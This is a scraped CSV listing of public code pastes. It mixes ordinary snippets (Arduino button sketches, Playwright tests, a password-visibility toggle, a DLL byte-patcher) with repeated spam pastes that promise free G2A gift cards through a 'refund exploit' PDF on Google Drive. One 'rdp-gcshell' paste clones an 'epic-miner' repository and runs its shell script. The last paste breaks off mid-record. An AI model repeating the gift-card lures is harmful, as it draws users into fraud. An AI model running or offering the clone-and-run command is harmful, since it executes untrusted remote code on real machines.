id,title,username,language,date,content
5Bs0rWC1,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,Darkew,JavaScript,Saturday 29th of June 2024 07:03:54 AM CDT,"G2A.com free gift card & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
zrG4JHKW,CreateElement update,drak138,JavaScript,Saturday 29th of June 2024 07:03:24 AM CDT,"function ce(type, attributes, ...content) {
    const result = document.createElement(type);

    Object.entries(attributes || {})
        .forEach(([attribute, value]) => {
            if (isEventListener(attribute)) {
                result.addEventListener(attribute.substring(2).toLocaleLowerCase(), value);
            } else {
                result[attribute] = value;
            }
        });

    content = content.reduce((a, c) => a.concat(Array.isArray(c) ? c : [c]), []);

    content.forEach(e => {
        if (isElement(e)) {
            result.appendChild(e);
        } else {
            const node = document.createTextNode(e);
            result.appendChild(node);
        }
    });

    return result;

    function isEventListener(attr) {
        return attr.substring(0, 2).localeCompare('on') === 0;
    }

    function isElement(element) {
        return typeof element != 'string' && typeof element != 'number';
    }
}"
eQRXmEhK,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,angeloee,JavaScript,Saturday 29th of June 2024 06:57:39 AM CDT,"G2A.com free gift card & games guide.
Any item for free on G2A.com including Playstation gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
Vpyqhx4G,Button Monitoring rev_02,pleasedontcode,Arduino,Saturday 29th of June 2024 06:52:29 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Button Monitoring
	- Source Code compiled for: Arduino Mega
	- Source Code created on: 2024-06-29 11:52:18

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* read button periodically */
/****** END SYSTEM REQUIREMENTS *****/


/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h> //https://github.com/evert-arias/EasyButton

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void onPressed(); // Prototype for the callback function

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t button_PushButton_PIN_D2 = 2;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
EasyButton button(button_PushButton_PIN_D2); // Initialize EasyButton object

/****** CALLBACK FUNCTION *****/
void onPressed() {
  Serial.println(""Button pressed"");
}

void setup(void) {
  // Initialize Serial for debugging purposes
  Serial.begin(115200);
  Serial.println();
  Serial.println("">>> EasyButton pressed example <<<"");

  // Initialize the button
  button.begin();
  // Add the callback function to be called when the button is pressed
  button.onPressed(onPressed);
}

void loop(void) {
  // Continuously read the status of the button
  button.read(); // SYSTEM REQUIREMENT 1: read button periodically
}

/* END CODE */"
1zX6BQwx,"""Button Detection"" rev_01",pleasedontcode,Arduino,Saturday 29th of June 2024 06:52:08 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Button Detection""
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2024-06-29 11:51:43

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* read button periodically */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h> //https://github.com/evert-arias/EasyButton

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void onPressed(); // Prototype for the callback function

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t button_PushButton_PIN_D2 = 2;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
EasyButton button(button_PushButton_PIN_D2); // Initialize EasyButton object

/****** CALLBACK FUNCTION *****/
void onPressed() {
  Serial.println(""Button pressed"");
}

void setup(void) {
  // Initialize Serial for debugging purposes
  Serial.begin(115200);
  Serial.println();
  Serial.println("">>> EasyButton pressed example <<<"");

  // Initialize the button
  button.begin();
  // Add the callback function to be called when the button is pressed
  button.onPressed(onPressed);
}

void loop(void) {
  // Continuously read the status of the button
  button.read(); // SYSTEM REQUIREMENT 1: read button periodically
}

/* END CODE */"
s1ZRCsN3,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,jcxeq,JavaScript,Saturday 29th of June 2024 06:51:36 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any item for free on G2A.com including Amazon gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
SX7YX0jj,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,PAUL-A8,JavaScript,Saturday 29th of June 2024 06:45:33 AM CDT,"G2A.com free gift card & games guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
AkWQiVxP,üéÅ G2A.COM FREE GIFT CARD GUIDE JUN 2024 V4 üéÅ,jusst2k4,GetText,Saturday 29th of June 2024 06:42:01 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_841693.pdf
 
Working as of:
29 June 2024"
7AmCVSez,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,Kevin_Chen1,JavaScript,Saturday 29th of June 2024 06:39:31 AM CDT,"G2A.com free voucher & games guide.
Any voucher for free on G2A.com including Xbox gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
LZfKU1sG,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,mano03,JavaScript,Saturday 29th of June 2024 06:33:15 AM CDT,"G2A.com free gift card & gaming guide.
Any voucher for free on G2A.com including Steam gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
rG92ksd9,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,gigi1964,JavaScript,Saturday 29th of June 2024 06:27:12 AM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Playstation gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
5hqdds1W,Passowrd visibility icon on vendor registration page,palsushobhan,PHP,Saturday 29th of June 2024 06:22:55 AM CDT,"add_action('wcfm_membership_registration_form_after_dynamic_custom_fields', function () {
    ?>
    <style>
        div#wcfm_membership_registration_form_expander {
            position: relative;
        }
        div#wcfm_membership_registration_form_expander span.password-visibility {
            position: absolute;
            right: 20px;
            margin-top: 8px;
        }
    </style>
    <?php
});

add_action('end_wcfm_membership_registration_form', function () {
    ?>
    <script>
    jQuery(function($) {
        $html = '<span class=""wcfmfa fa-eye text_tip password-visibility""></span>';
        $('#wcfm_membership_registration_form input[type=""password""').after($html);
        $('#wcfm_membership_registration_form').on('click', 'span.password-visibility', function(e) {
            $pass_input = $(this).prev('input');
            if($(this).hasClass('fa-eye-slash')) {
                $pass_input[0].type = 'password';
                $(this).removeClass('fa-eye-slash');
                $(this).addClass('fa-eye');
            } else {
                $pass_input[0].type = 'text';
                $(this).removeClass('fa-eye');
                $(this).addClass('fa-eye-slash');
            }
        });
    });
    </script>
    <?php
});"
MzPMJx8Q,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,TeleBot,JavaScript,Saturday 29th of June 2024 06:20:55 AM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Playstation gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
yd17vwMa,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,William95,JavaScript,Saturday 29th of June 2024 06:14:47 AM CDT,"G2A.com complimentary voucher & games guide.
Any voucher for free on G2A.com including Amazon gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
NTPR00AG,pedaliii,BbJLeB,JavaScript,Saturday 29th of June 2024 06:12:51 AM CDT,"const { test, describe, beforeEach, afterEach, beforeAll, afterAll, expect } = require('@playwright/test');
const { chromium } = require('playwright');

const host = 'http://127.0.0.1:5500';

let browser;
let context;
let page;

let user = {
    email: """",
    password: ""123456"",
    confirmPass: ""123456"",
};

let albumName = """";

describe(""e2e tests"", () => {
    beforeAll(async () => {
        browser = await chromium.launch();
    });

    afterAll(async () => {
        await browser.close();
    });

    beforeEach(async () => {
        context = await browser.newContext();
        page = await context.newPage();
    });

    afterEach(async () => {
        await page.close();
        await context.close();
    });

    describe(""authentication"", () => {

        test(""Registration with Valid Data"", async () => {
            await page.goto(host);
            await page.click('text=Register');

            await page.waitForSelector('form');

            let random = Math.floor(Math.random() * 1000);
            user.email = `abv_${random}@abv.bg`;

            await page.locator(""#email"").fill(user.email);
            await page.locator(""#password"").fill(user.password);
            await page.locator(""#conf-pass"").fill(user.confirmPass);
            let [response] = await Promise.all([
                page.waitForResponse(response => response.url().includes('/users/register') && response.status() === 200),
                page.click('[type=""submit""]')
            ]);
            
            await expect(response.ok()).toBeTruthy();
            let userData = await response.json();

            expect(userData.email).toBe(user.email);
            expect(userData.password).toEqual(user.password);

        });

        test(""Login with Valid Data"", async () => {
            await page.goto(host);
            await page.click('text=Login');

            await page.waitForSelector('form');
            
            
            await page.locator(""#email"").fill(user.email);
            await page.locator(""#password"").fill(user.password);
            let [response] = await Promise.all([
                page.waitForResponse(response => response.url().includes(""/users/login"") && response.status() === 200),
                page.click('[type=""submit""]')
            ]);
            
            expect(response.ok()).toBeTruthy();
            let userData = await response.json();
            //console.log(userData);
            expect(userData.email).toBe(user.email);
            expect(userData.password).toEqual(user.password);
        });

        test(""Logout from the Application"", async () => {
            await page.goto(host);
            await page.click('text=Login');

            await page.waitForSelector('form');
            
            await page.locator(""#email"").fill(user.email);
            await page.locator(""#password"").fill(user.password);
            await page.click('[type=""submit""]');

            let [response] = await Promise.all([
                page.waitForResponse(response => response.url().includes(""/users/logout"") && response.status() === 204),
                page.locator('nav >> text=logout').click()
            ]);

            expect(response.ok).toBeTruthy();
            await page.waitForSelector('nav >> text=Login');

            expect(page.url()).toBe(host + ""/"");

        });

    });

    describe(""navbar"", () => {

        test('logged user should see correct navigation', async () => {
            await page.goto(host);

            await page.click('text=Login');
            await page.waitForSelector('form');
            await page.locator(""#email"").fill(user.email);
            await page.locator(""#password"").fill(user.password);
            await page.click('[type=""submit""]')

            await expect(page.locator('nav >> text=Home')).toBeVisible();
            await expect(page.locator('nav >> text=Catalog')).toBeVisible();
            await expect(page.locator('nav >> text=Search')).toBeVisible();
            await expect(page.locator('nav >> text=Create Album')).toBeVisible();
            await expect(page.locator('nav >> text=Login')).toBeHidden();
            await expect(page.locator('nav >> text=Register')).toBeHidden();
        });

        test('guest user should see correct navigation', async () => {
            await page.goto(host);

            await expect(page.locator('nav >> text=Home')).toBeVisible();
            await expect(page.locator('nav >> text=Logout')).toBeHidden();
            await expect(page.locator('nav >> text=Create Album')).toBeHidden();
            await expect(page.locator('nav >> text=Search')).toBeVisible();
            await expect(page.locator('nav >> text=Login')).toBeVisible();
            await expect(page.locator('nav >> text=Register')).toBeVisible();
        });


    });

    describe(""CRUD"", () => {

        test('Create an Album Testing', async () => {
            await page.goto(host);

            await page.click('text=Login');
            await page.waitForSelector('form');
            await page.locator(""#email"").fill(user.email);
            await page.locator(""#password"").fill(user.password);
            await page.click('[type=""submit""]')
            
            await page.click('text=Create Album');
            await page.waitForSelector('form');

            albumName = `Test Album ${Math.floor(Math.random() * 10000)}`;

            await page.fill('input[name=""name""]', albumName);
            await page.fill('input[name=""imgUrl""]', '/images/test.jpg');
            await page.fill('input[name=""price""]', '19.99');
            await page.fill('input[name=""releaseDate""]', '2024-06-29');
            await page.fill('input[name=""artist""]', 'Test Artist');
            await page.fill('input[name=""genre""]', 'Test Genre');
            await page.fill('textarea[name=""description""]', 'Test Description');

            const [response] = await Promise.all([
                page.waitForResponse(response => response.status() === 200 && response.url().includes('/data/albums')),
                page.click('[type=""submit""]')
            ]);

            expect(response.ok()).toBeTruthy();

            const responseBody = await response.json();
            expect(responseBody.name).toBe(albumName);
            expect(responseBody.imgUrl).toBe('/images/test.jpg');
            expect(responseBody.price).toBe('19.99');
            expect(responseBody.releaseDate).toBe('2024-06-29');
            expect(responseBody.artist).toBe('Test Artist');
            expect(responseBody.genre).toBe('Test Genre');
            expect(responseBody.description).toBe('Test Description');
        });

        test(""User is able to edit an album"", async ()=>{
            //arrange
            await page.goto(host);
            await page.click(""text=Login"");
            await page.waitForSelector('form');
            await page.locator('#email').fill(user.email);
            await page.locator('#password').fill(user.password);
            await page.click('[type=""submit""]');
            //act
            await page.click(""text = Search"")
            await page.locator('#search-input').fill(albumName);
            await page.locator('.button-list').click();
            await page.locator('#details').first().click();
            await page.click('text = Edit');
            await page.waitForSelector('form');
            await page.locator('#price').fill(""15"");
 
            let [response] = await Promise.all([page.waitForResponse(response => response.url().includes(""/data/albums"")
            && response.status() == 200), page.click('[type=""Submit""]')
           ]);
           let eventData = await response.json();
           //assert
           await expect(response.ok()).toBeTruthy();
           expect(eventData.name).toEqual(albumName); 
            expect(eventData.imgUrl).toEqual('/images/test.jpg');
            expect(eventData.price).toEqual('15');
            expect(eventData.releaseDate).toEqual('2024-06-29');
            expect(eventData.artist).toEqual('Test Artist');
            expect(eventData.genre).toEqual('Test Genre');
            expect(eventData.description).toEqual('Test Description');
        })
 
        test(""User is able to delete an album"", async ()=>{
            //arrange
            await page.goto(host);
            await page.click(""text=Login"");
            await page.waitForSelector('form');
            await page.locator('#email').fill(user.email);
            await page.locator('#password').fill(user.password);
            await page.click('[type=""submit""]');
            //act
            await page.click(""text = Search"")
            await page.locator('#search-input').fill(albumName);
            await page.locator('.button-list').click();
            await page.locator('#details').first().click();
          //  await page.locator(""text = Delete"").click();
            let [response] = await Promise.all([page.waitForResponse(response => response.url().includes(""/data/albums"")
            && response.status() == 200),
            page.on('dialog', dialog => dialog.accept()),
            page.click('text = Delete')
           ]);
 
           //assert
           await expect(response.ok()).toBeTruthy();
        });
 
    });
});
"
YEDS8jMk,Untitled,jaVer404,Python,Saturday 29th of June 2024 06:10:49 AM CDT,"def split_pages(file_path):
    # –í—ñ–¥–∫—Ä–∏–≤–∞—î–º–æ —Ñ–∞–π–ª –∑ –∫–æ–¥—É–≤–∞–Ω–Ω—è–º cp1251
    with open(file_path, 'r', encoding='cp1251') as file:
        text = file.read()

    # –†–æ–∑–¥—ñ–ª—è—î–º–æ —Ç–µ–∫—Å—Ç –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –∑–∞ —Å–∏–º–≤–æ–ª–æ–º —Ä–æ–∑—Ä–∏–≤—É —Å—Ç–æ—Ä—ñ–Ω–∫–∏ '\f'
    pages = text.split('\x0c')

    # –û–±—Ä—ñ–∑–∞—î–º–æ –∑–∞–π–≤—ñ –ø—Ä–æ–±—ñ–ª–∏ –∑ –ø–æ—á–∞—Ç–∫—É —Ç–∞ –∫—ñ–Ω—Ü—è –∫–æ–∂–Ω–æ—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏
    pages = [page.strip() for page in pages]

    return pages"
sQdrc6w0,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,romikdikson,JavaScript,Saturday 29th of June 2024 06:08:44 AM CDT,"G2A.com free voucher & games guide.
Any voucher for free on G2A.com including Playstation gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
ezhWepZC,data972,TestGuy1,JSON,Saturday 29th of June 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'ab9cab1856b66ba0ede208e38af1d0bb328cf8baa57543466e2d4278a8232f061665161e0085f645f510a512d5b838991367eca89c73c68511e4d43f3c4e17138d2b8cb3156381921ede3cbbe20064848c80bdc29923a6868fbfacd59d9f33a8e4d88c69c1a431be6b0457d1466a954efe43df93cb04e347db2294fb04ac814e',
  otherdata: [
    'df74303aa01cf4e8cb9c9e356ff825e8',
    '1ce20219d96235daf516878b84275913',
    '866e4ae06a871f15709a46f3533d9643',
    '62f41249085fa8bee7d052e1629e68b9',
    'afd4dcf5e5683568f8baa1b72f9cd3ca',
    'af3622ddee5934b17ba3e75a8208645d',
    '425ced06dd8671d8b69675a3dcaa2f88',
    'a81a0f831895273693b18822777918a9'
  ]
}"
wCfNqHhb,"""Button Handling"" rev_01",pleasedontcode,Arduino,Saturday 29th of June 2024 05:10:30 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Button Handling""
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2024-06-29 10:09:06

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Create an Arduino project utilizing the PCA9685 */
	/* and EasyButton libraries to manage push buttons on */
	/* pins D2, D3, D4, D5, and D6. Configure pins with */
	/* INPUT_PULLUP and implement a loop function to */
	/* detect and respond to button presses. */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h>  // https://github.com/evert-arias/EasyButton

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t PushButton_PIN_D2 = 2;
const uint8_t PushButton_PIN_D3 = 3;
const uint8_t PushButton_PIN_D4 = 4;
const uint8_t Home_PushButton_PIN_D5 = 5;
const uint8_t Home_PushButton_PIN_D6 = 6;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
EasyButton button1(PushButton_PIN_D2);
EasyButton button2(PushButton_PIN_D3);
EasyButton button3(PushButton_PIN_D4);
EasyButton button4(Home_PushButton_PIN_D5);
EasyButton button5(Home_PushButton_PIN_D6);

/****** CALLBACK FUNCTIONS *****/
void onButton1Pressed() {
  Serial.println(""Button 1 pressed"");
}

void onButton2Pressed() {
  Serial.println(""Button 2 pressed"");
}

void onButton3Pressed() {
  Serial.println(""Button 3 pressed"");
}

void onButton4Pressed() {
  Serial.println(""Button 4 pressed"");
}

void onButton5Pressed() {
  Serial.println(""Button 5 pressed"");
}

void setup(void) {
  // Initialize Serial for debugging purposes
  Serial.begin(115200);

  Serial.println();
  Serial.println("">>> EasyButton multiple buttons example <<<"");

  // Initialize buttons
  button1.begin();
  button2.begin();
  button3.begin();
  button4.begin();
  button5.begin();

  // Attach callback functions
  button1.onPressed(onButton1Pressed);
  button2.onPressed(onButton2Pressed);
  button3.onPressed(onButton3Pressed);
  button4.onPressed(onButton4Pressed);
  button5.onPressed(onButton5Pressed);
}

void loop(void) {
  // Continuously read the status of the buttons
  button1.read();
  button2.read();
  button3.read();
  button4.read();
  button5.read();
}

/* END CODE */"
rjrEFAmt,rdp-gcshell,maruf17,Bash,Saturday 29th of June 2024 04:49:36 AM CDT,"git clone https://github.com/epic-miner/RDP.git
cd RDP
sh aman.sh

"
NYxxdNLi,API-Hooking-Process,alien_fx_fiend,C++,Saturday 29th of June 2024 04:34:05 AM CDT,"#include <Windows.h>
#include <string>
#include <TlHelp32.h>
#include <tchar.h>
#include <Psapi.h>
#include <iostream>

#pragma comment(lib, ""Psapi.lib"")

BOOL notepadHooked = FALSE;
BOOL notepadPlusPlusHooked = FALSE;

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        std::wcout << L""LookupPrivilegeValue error: "" << GetLastError() << std::endl;
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        std::wcout << L""AdjustTokenPrivileges error: "" << GetLastError() << std::endl;
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::wcout << L""The token does not have the specified privilege. \n"" << std::endl;
        return FALSE;
    }

    return TRUE;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess != NULL) {
        TCHAR szProcessName[MAX_PATH] = TEXT(""<unknown>"");
        if (GetModuleFileNameEx(hProcess, NULL, szProcessName, MAX_PATH)) {
            std::wstring processName(szProcessName);
            size_t pos = processName.find_last_of(L""\\"");
            if (pos != std::wstring::npos) {
                processName = processName.substr(pos + 1);
            }
            CloseHandle(hProcess);

            TCHAR windowTitle[MAX_PATH];
            GetWindowText(hwnd, windowTitle, MAX_PATH);

            std::wcout << L""Process: "" << processName << L"", Window Title: "" << windowTitle << std::endl;

            if (processName == L""notepad.exe"") {
                std::wstring newTitle = L""Wormhole Vortex"";
                if (SetWindowText(hwnd, newTitle.c_str())) {
                    std::wcout << L""Modified window title of "" << processName << std::endl;
                    notepadHooked = TRUE;
                }
                else {
                    std::wcout << L""Failed to modify window title of "" << processName << std::endl;
                }
            }
            if (processName == L""notepad++.exe"") {
                std::wstring newTitle = L""Wormhole Vortex"";
                if (SetWindowText(hwnd, newTitle.c_str())) {
                    std::wcout << L""Modified window title of "" << processName << std::endl;
                    notepadPlusPlusHooked = TRUE;
                }
                else {
                    std::wcout << L""Failed to modify window title of "" << processName << std::endl;
                }
            }
        }
        else {
            std::wcout << L""GetModuleFileNameEx error: "" << GetLastError() << std::endl;
        }
    }
    return TRUE;
}

int main() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::wcout << L""OpenProcessToken error: "" << GetLastError() << std::endl;
        return 1;
    }

    if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
        std::wcout << L""Failed to enable debug privilege."" << std::endl;
        CloseHandle(hToken);
        return 1;
    }

    EnumWindows(EnumWindowsProc, 0);

    if (notepadHooked) {
        std::cout << ""Notepad.exe window titles modified successfully."" << std::endl;
    }
    else {
        std::cout << ""Unable to modify Notepad.exe window titles."" << std::endl;
    }

    if (notepadPlusPlusHooked) {
        std::cout << ""Notepad++.exe window titles modified successfully."" << std::endl;
    }
    else {
        std::cout << ""Unable to modify Notepad++.exe window titles."" << std::endl;
    }

    std::cout << ""Press enter to exit..."";
    std::cin.get();

    SetPrivilege(hToken, SE_DEBUG_NAME, FALSE);
    CloseHandle(hToken);
    return 0;
}
"
N8T9fM2m,ScriptHookV_Patch.html,Thunder-Menu,HTML,Saturday 29th of June 2024 04:33:09 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Hex Pattern Replacer</title>
</head>
<body>
    <h1>Replace Hex Pattern in ScriptHookV.dll</h1>
    <input type=""file"" id=""fileInput"" />
    <p id=""status""></p>

    <script>
        document.getElementById('fileInput').addEventListener('change', replaceHexPattern);

        function replaceHexPattern(event) {
            const file = event.target.files[0];

            if (!file) {
                document.getElementById('status').textContent = 'Please select a file.';
                return;
            }

            const reader = new FileReader();
            reader.onload = function(event) {
                const arrayBuffer = event.target.result;
                const uint8Array = new Uint8Array(arrayBuffer);
                const hexPattern = [0x74, 0x3A, 0x48, 0x8D, 0x0D];
                const replacementPattern = [0xEB, 0x3A, 0x48, 0x8D, 0x0D];

                for (let i = 0; i < uint8Array.length - hexPattern.length; i++) {
                    let match = true;
                    for (let j = 0; j < hexPattern.length; j++) {
                        if (uint8Array[i + j] !== hexPattern[j]) {
                            match = false;
                            break;
                        }
                    }
                    if (match) {
                        for (let j = 0; j < replacementPattern.length; j++) {
                            uint8Array[i + j] = replacementPattern[j];
                        }
                        break;
                    }
                }

                const blob = new Blob([uint8Array], { type: 'application/octet-stream' });
                const link = document.createElement('a');
                link.href = URL.createObjectURL(blob);
                link.download = 'ScriptHookV_modified.dll';
                link.click();

                document.getElementById('status').textContent = 'Pattern replaced and file downloaded.';
            };
            reader.readAsArrayBuffer(file);
        }
    </script>
</body>
</html>
"
6KHPQ7MX,API-Hooking-Example,alien_fx_fiend,C++,Saturday 29th of June 2024 04:32:22 AM CDT,"#include <windows.h>
#include <iostream>

int main() {
    HWND hwnd = FindWindow(NULL, L""*Untitled - Notepad""); // search for ""*Untitled - Notepad""
    if (hwnd != NULL) {
        SetWindowText(hwnd, L""Wormhole Vortex""); // change the title of the window
        std::cout << ""Code Injected Successfully into Notepad Process!"" << std::endl; // print the message to the console
    }
    else {
        hwnd = FindWindow(NULL, L""Untitled - Notepad""); // search for ""Untitled - Notepad""
        if (hwnd != NULL) {
            SetWindowText(hwnd, L""Wormhole Vortex""); // change the title of the window
            std::cout << ""Code Injected Successfully into Notepad Process!"" << std::endl; // print the message to the console
        }
        else {
            std::cout << ""No window with the specified title was found."" << std::endl;
        }
    }

    // Keep the console window open
    std::cout << ""Press any key to exit..."" << std::endl;
    std::cin.get();

    return 0;
}"
ErNcLMM4,[PAC3] Bite Animation,Cleffy,Lua,Saturday 29th of June 2024 04:27:59 AM CDT,"[1] = {
	[""children""] = {
		[1] = {
			[""children""] = {
				[1] = {
					[""children""] = {
					},
					[""self""] = {
						[""DrawOrder""] = 0,
						[""UniqueID""] = ""19cec5a9be06f3333bc3affc17e63cf346a2229a2d5d4f7b2d4ead40a0d848b3"",
						[""URL""] = """",
						[""TargetEntityUID""] = """",
						[""Offset""] = 0,
						[""BonePower""] = 1,
						[""Hide""] = false,
						[""Name""] = ""Chomp"",
						[""StopOnHide""] = true,
						[""ClassName""] = ""custom_animation"",
						[""EditorExpand""] = true,
						[""AnimationType""] = ""gesture"",
						[""Interpolation""] = ""linear"",
						[""IsDisturbing""] = false,
						[""Rate""] = 1,
						[""Data""] = ""{\""Type\"":\""gesture\"",\""FrameData\"":[{\""FrameRate\"":5.0,\""BoneInfo\"":{\""LrigPelvis\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":-0.0,\""MF\"":-2.0,\""RF\"":0.0},\""Lrig_LEG_BR_Femur\"":{\""RU\"":4.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""LrigNeck3\"":{\""RU\"":14.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":-0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_Metacarpus\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FR_FrontHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""LrigNeck2\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BL_RearHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_FrontHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Jaw\"":{\""RU\"":6.0,\""MU\"":0.0,\""MF\"":-0.30000001192092898,\""MR\"":-0.5,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_Radius\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FR_Humerus\"":{\""RU\"":5.0,\""MU\"":0.0